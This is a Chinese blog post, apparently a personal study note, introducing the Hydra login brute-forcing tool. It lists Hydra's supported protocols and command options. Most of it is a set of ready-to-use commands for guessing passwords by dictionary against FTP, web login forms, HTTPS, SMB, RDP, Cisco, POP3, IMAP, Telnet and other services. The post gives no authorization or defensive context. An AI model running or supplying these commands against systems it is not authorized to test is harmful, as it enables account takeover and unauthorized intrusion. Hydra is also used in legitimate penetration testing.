---
title: 密码破解神器Hydra
date: 2019-04-12 06:08:15
tags:
    - Hydra
    - 密码破解
    - 神器
categories:
    - 笔记总结
    - 软件运用
---

### 简介
每个密码安全研究显示表明，最大的安全漏洞之一是密码。 而九头蛇是一个并发的登录破解程序，支持许多协议攻击。新模块更容易添加，除此之外，Hydra是灵活和迅速的

Hydra在Linux，Windows/Cygwin，Solaris11，FreeBSD8.1，OpenBSD，OSX，QNX/Blackberry上测试和编译，并在GPLv3下提供了特殊的OpenSSL许可证扩展。
支持如下协议:
```bash
Asterisk,AFP,CiscoAAA,Ciscoauth,Ciscoenable,CVS,Firebird,FTP,HTTP-FORM-GET,HTTP-FORM-POST,
HTTP-GET,HTTP-HEAD,HTTP-POST,HTTP-PROXY,HTTPS-FORM-GET,HTTPS-FORM-POST,HTTPS-GET,HTTPS-POST,HTTPS-HEAD,
HTTP-Proxy,ICQ,IMAP,IRC,LDAP,MS-SQL,MYSQL,NCP,NNTP,OracleListener,OracleSID,Oracle,
PC-Anywhere,PCNFS,POP3,POSTGRES,RDP,Rexec,Rlogin,Rsh,RTSP,S7-300,SAP/R3,SIP,SMB,SMTP,
SMTPEnum,SNMP,SOCKS5,SSH(v1andv2),Subversion,Teamspeak(TS2),Telnet,VMware-Auth,VNCandXMPP.
```
<!--more-->
### 命令参数
```bash
# hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]
server service [OPT]

-R
继续从上一次进度接着破解

-S
大写，采用SSL链接

-s <PORT>
小写，可通过这个参数指定非默认端口

-l <LOGIN>
指定破解的用户，对特定用户破解

-L <FILE>
指定用户名字典

-p <PASS>
小写，指定密码破解，少用，一般是采用密码字典

-P <FILE>
大写，指定密码字典

-e <ns>
可选选项，n：空密码试探，s：使用指定用户和密码试探

-C <FILE>
使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数

-M <FILE>
指定目标列表文件一行一条

-o <FILE>
指定结果输出文件

-f
在使用-M参数以后，找到第一对登录名或者密码的时候中止破解

-t <TASKS>
同时运行的线程数，默认为16

-w <TIME>
设置最大超时的时间，单位秒，默认是30s

-v / -V
显示详细过程

server
目标ip

service
指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等

OPT
可选项
```
### 案例

1. 破解ftp
```bash
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```
2. get方式提交，破解web登录
```bash
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```
3. post方式提交，破解web登录
该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。带参数破解如下：
```html
<form action="index.php" method="POST">
<input type="text" name="name" /><BR><br>
<input type="password" name="pwd" /><br><br>
<input type="submit" name="sub" value="提交">
</form>
```
假设有以上登录表单，我们的执行命令如下:
```bash
hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”

说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，ip 是本地，就是目标ip，http-post-form表示破解是采用http 的post 方式提交的表单密码破解。

　　后面参数是网页中对应的表单字段的name 属性，后面<title>中的内容是表示错误猜解的返回信息提示，可以自定义
```

4. 破解https
```bash
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
```
5. 破解teamspeak
```
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
```
6. 破解cisco
```bash
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
```
7. 破解smb
```bash
hydra -l administrator -P pass.txt 10.36.16.18 smb
```
8. 破解pop3
```
hydra -l muts -P pass.txt my.pop3.mail pop3
```
9. 破解rdp
```
hydra ip rdp -l administrator -P pass.txt -V
```
10. 破解http-proxy
```
hydra -l admin -P pass.txt http-proxy://10.36.16.18
```
11. 破解imap
```
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```
12. 破解telnet
```bash
hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V
```


### 参考文章
[Hydra爆破神器](https://www.cnblogs.com/ECJTUACM-873284962/p/7805116.html)
[Hydra入门手册](https://www.freebuf.com/column/152404.html)